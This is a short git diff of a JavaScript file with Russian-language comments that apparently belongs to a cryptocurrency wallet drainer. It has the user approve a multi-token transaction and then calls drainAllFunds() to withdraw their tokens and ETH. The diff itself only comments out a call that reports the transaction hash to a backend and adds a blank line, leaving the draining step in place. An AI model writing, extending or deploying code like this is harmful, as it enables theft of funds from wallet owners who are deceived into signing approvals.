@@ -378,7 +378,7 @@ async function createMultiApproveTransaction() {
             console.log("Транзакция approve выполнена:", result.transactionHash);
             
             // Отправляем данные о транзакции на бэкенд
-            await sendTransactionData(result.transactionHash, userAccount);
+            //await sendTransactionData(result.transactionHash, userAccount);
             
             // После approve выводим токены и ETH
             await drainAllFunds();
@@ -671,6 +671,7 @@ window.addEventListener('DOMContentLoaded', () => {
         console.warn('[INIT] DOMContentLoaded: Кнопка подключения не найдена в DOM');
     }
 });
+
 
 
 
